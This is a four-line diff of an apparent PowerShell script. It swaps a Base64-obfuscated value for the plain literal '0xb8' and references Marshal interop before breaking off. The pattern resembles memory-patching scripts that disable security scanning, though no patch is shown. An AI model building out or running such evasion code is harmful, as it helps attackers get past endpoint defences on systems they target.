@@ -1,4 +1,4 @@
-$v = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("MAB4AEIAOAA="))
+$v = "0xb8"
 $p = 0
 $7amada = [System.Runtime.InteropServices.Marshal]
 $ahh = @"
